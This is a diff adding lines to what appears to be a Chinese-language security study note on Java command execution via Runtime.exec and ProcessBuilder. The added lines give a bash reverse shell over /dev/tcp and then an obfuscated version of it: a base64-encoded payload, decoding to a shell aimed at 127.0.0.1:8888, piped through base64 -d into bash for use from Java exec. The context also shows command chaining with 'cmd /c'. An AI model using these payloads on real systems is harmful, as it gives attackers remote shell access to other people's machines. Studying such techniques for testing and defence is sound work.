@@ -17,6 +17,19 @@ Runtime.getRuntime().exec("cmd /c ping 127.0.0.1 && dir");
 //有/c或者linux的-c参数就可以命令拼接。c告诉cmd.exe 执行字符串指定的命令。
 //exec()可以接收字符串，以及字符串数组等。
 ```
+
+
+注意java这里反弹shell需要改良
+
+```
+Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");
+
+bash -i >& /dev/tcp/ip/port 0>&1 需要base64编码再执行下面：
+
+bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
+```
+
+
 第二种：
 ```
 new ProcessBuilder("calc").start();
